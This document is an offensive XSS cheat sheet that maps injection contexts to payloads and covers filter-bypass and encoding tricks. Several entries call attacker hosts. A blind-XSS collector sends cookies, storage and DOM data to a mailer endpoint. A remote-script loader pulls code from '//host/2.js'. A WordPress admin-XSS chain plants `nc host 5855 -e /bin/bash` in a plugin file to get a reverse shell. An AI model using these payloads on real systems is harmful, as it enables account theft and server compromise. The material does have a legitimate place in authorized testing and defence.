# Patterns & Techniques — XSS Cheat Sheet

> 2018-era vectors — mutate against the observed filter, not the documented one. Proof ceiling + routing: `sources.md`.

## Context → Vector Mapping
**When to use**: every injection point, always first step
**How**: locate reflection → classify (tag / block-tag / attribute-inline / attribute-source / JS-string / JS-logical-block / header / DOM) → pick vector family → adapt quote style
**Trade-offs**: skipping classification wastes requests on impossible vectors

## Reflection Fragment Chaining
**When to use**: same input reflected 2–3 times, or across multiple params
**How**: open with partial fragment (`'onload=`, `*/`, backtick) that a later reflection completes; verify each point's quoting
**Trade-offs**: fragile — one filtered fragment kills the chain

## Event-Handler Inline Injection
**When to use**: attribute-value reflection where `>` can't appear
**How**: `"onmouseover=alert(1)//` or `"autofocus/onfocus=alert(1)//` (autofocus fires without user)
**Trade-offs**: onmouseover needs hover; autofocus/onfocus is interaction-free

## Scheme-Based Source Injection
**When to use**: reflection in href/src/data/action/formaction
**How**: `javascript:alert(1)` for href-action sinks; `data:text/html,<svg onload=alert(1)>` when full markup needed; external `//host/x.js` for script src
**Trade-offs**: `javascript:` needs click on links; `data:` URI restricted in some contexts

## Blocked-Primitive Bypass Selection
**When to use**: filter strips a specific char/keyword
**How**: map primitive → technique: parens→backtick/`&lpar;`; `>`→unclosed tag+`//`; keywords→`top["al"+"ert"]`, regex-source, `\u0065` escapes; alphabetic→octal escapes `[]['\146…']`; tag names→agnostic `<x on*>`; space→`%09 %0A %0C %0D / +`; quotes→entity `&#34;`/`&#39;`
**Trade-offs**: each adds length; combine minimally

## Encoding Escalation
**When to use**: input decoded/transformed before sink
**How**: single-encode → double-encode (`%253C`) → HTML entity → JS octal/hex/unicode — match the decode depth
**Trade-offs**: over-encoding breaks parsing; verify decode count first

## postMessage Exploitation
**When to use**: `addEventListener('message')` without strict origin check
**How**: iframe target + `frames[0].postMessage('PAYLOAD','*')`; origin check → prepend allowed origin as attacker subdomain; Crosspwn automates
**Trade-offs**: requires frameable target (XFO) and reachable listener code path

## Remote Script Bootstrap
**When to use**: need big payload through tiny/WAF'd injection slot
**How**: `with(document)body.appendChild(createElement('script')).src='//host/2.js'` or fetch+`write()`; iterate payload server-side
**Trade-offs**: outbound requests may hit CSP `script-src`/connect-src

## Blind XSS Collection
**When to use**: injection surfaces only in staff/admin views
**How**: `<script src=//host/mailer.js>` — callback POSTs UA/URL/cookies/storage/DOM to PHP mailer endpoint; set ACAO header echoing origin
**Trade-offs**: async trigger time; mustn't exfil beyond authorization scope

## XSS → RCE (WordPress)
**When to use**: authenticated-admin XSS on WordPress ≤4.9.1
**How**: GET plugin-editor → scrape `_wpnonce` → POST `newcontent=<?=`nc host 5855 -e /bin/bash`;?>` → fetch plugin file → shell
**Trade-offs**: version/role dependent; nc path may differ

## Base-Tag Shortest XSS
**When to use**: very short injection slot + native relative-path script exists after injection
**How**: `<base href=//short.do>` rewrites relative `src` to attacker host (serve payload at same path or via 404)
**Trade-offs**: needs cooperative native script + short domain

## Encoding Table Construction
**When to use**: building any custom bypass
**How**: look up char → `%XX` / `&#N;`/`&name;` / `\NNN` / `\xNN` / `\u00NN`; URL-encode `&`→`%26`, `#`→`%23` in params
**Trade-offs**: entities only decode in HTML context; JS escapes only in script context
